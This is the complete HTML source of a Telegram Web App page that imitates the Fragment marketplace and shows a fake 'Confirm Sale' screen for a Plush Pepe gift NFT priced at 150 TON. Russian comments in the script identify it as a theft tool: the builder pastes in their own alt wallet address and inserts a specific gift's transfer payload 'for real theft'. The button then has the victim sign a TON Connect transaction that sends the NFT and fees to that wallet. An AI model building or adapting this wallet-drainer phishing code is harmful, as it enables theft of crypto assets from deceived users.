<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: #0e0f13;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 16px 20px;
            background-color: #0e0f13;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        .back-btn {
            background: none;
            border: none;
            color: #0098ea;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            display: flex;
            align-items: center;
        }
        .header-title {
            font-weight: 600;
            font-size: 17px;
            color: #ffffff;
        }
        .header-icon {
            width: 28px;
            height: 28px;
            background: #2a2c35;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }
        .content {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
        }
        .gift-card {
            background: #1c1d22;
            border-radius: 20px;
            padding: 24px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
        }
        .gift-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0,152,234,0.1) 0%, transparent 60%);
            pointer-events: none;
        }
        .gift-image-container {
            width: 180px;
            height: 180px;
            background: linear-gradient(135deg, #2a2c35 0%, #1c1d22 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
            border: 2px solid rgba(255,255,255,0.05);
            position: relative;
            z-index: 1;
        }
        .gift-image {
            font-size: 90px;
            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
        }
        .gift-name {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 4px;
            z-index: 1;
        }
        .gift-collection {
            font-size: 14px;
            color: #8b8e96;
            margin-bottom: 20px;
            z-index: 1;
        }
        .price-container {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 152, 234, 0.1);
            padding: 12px 24px;
            border-radius: 12px;
            z-index: 1;
        }
        .price-value {
            font-size: 28px;
            font-weight: 800;
            color: #0098ea;
        }
        .price-currency {
            font-size: 16px;
            font-weight: 600;
            color: #0098ea;
            margin-top: 4px;
        }
        .details {
            width: 100%;
            background: #1c1d22;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
        }
        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .detail-row:last-child {
            border-bottom: none;
        }
        .detail-label {
            color: #8b8e96;
            font-size: 15px;
        }
        .detail-value {
            font-weight: 500;
            font-size: 15px;
        }
        .sell-btn {
            background-color: #0098ea;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
            box-shadow: 0 4px 15px rgba(0, 152, 234, 0.3);
            margin-bottom: 16px;
        }
        .sell-btn:active {
            background-color: #007bbd;
        }
        .status {
            color: #8b8e96;
            font-size: 14px;
            text-align: center;
            height: 20px;
        }
    </style>
</head>
<body>

    <div class="header">
        <button class="back-btn">‹</button>
        <div class="header-title">Fragment</div>
        <div class="header-icon">👤</div>
    </div>

    <div class="content">
        <div class="gift-card">
            <div class="gift-image-container">
                <div class="gift-image">🎁</div>
            </div>
            <div class="gift-name">Plush Pepe #2480</div>
            <div class="gift-collection">Plush Pepe Collection</div>
            
            <div class="price-container">
                <div class="price-value">150</div>
                <div class="price-currency">TON</div>
            </div>
        </div>

        <div class="details">
            <div class="detail-row">
                <div class="detail-label">Seller</div>
                <div class="detail-value">You</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Buyer</div>
                <div class="detail-value">Verified User</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Network Fee</div>
                <div class="detail-value">0.05 TON</div>
            </div>
        </div>

        <button class="sell-btn" id="sellBtn">Confirm Sale</button>
        <div class="status" id="statusText">Waiting for confirmation...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // СЮДА ВСТАВЬ АДРЕС СВОЕГО КОШЕЛЬКА (ТВИНКА)
        const MY_WALLET_ADDRESS = "UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k"; 
        
        // Это заглушка payload для перевода NFT. Для реальной кражи сюда нужно вставить код конкретного подарка.
        const NFT_TRANSFER_PAYLOAD = "te6cckEBAQEAAgAAAEysuc0="; 

        const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
            manifestUrl: "https://snoix69.github.io/swap-helper/tonconnect-manifest.json"
        });

        document.getElementById("sellBtn").onclick = async () => {
            if (MY_WALLET_ADDRESS === "UQ_ТВОЙ_АДРЕС_КОШЕЛЬКА") {
                document.getElementById("statusText").innerText = "Ошибка: адрес кошелька не указан.";
                return;
            }

            document.getElementById("statusText").innerText = "Opening wallet...";
            
            try {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: MY_WALLET_ADDRESS,
                            amount: "50000000", // 0.05 TON на комиссию сети
                            payload: NFT_TRANSFER_PAYLOAD
                        }
                    ]
                };

                await tonConnectUI.sendTransaction(transaction);
                
                document.getElementById("statusText").innerText = "Success! Returning to bot...";
                
                // Отправляем данные боту, чтобы он написал "Ожидайте зачисления"
                tg.sendData(JSON.stringify({status: "sold", item: "Plush Pepe #2480"}));
                
            } catch (e) {
                document.getElementById("statusText").innerText = "Transaction cancelled.";
            }
        };
    </script>
</body>
</html>
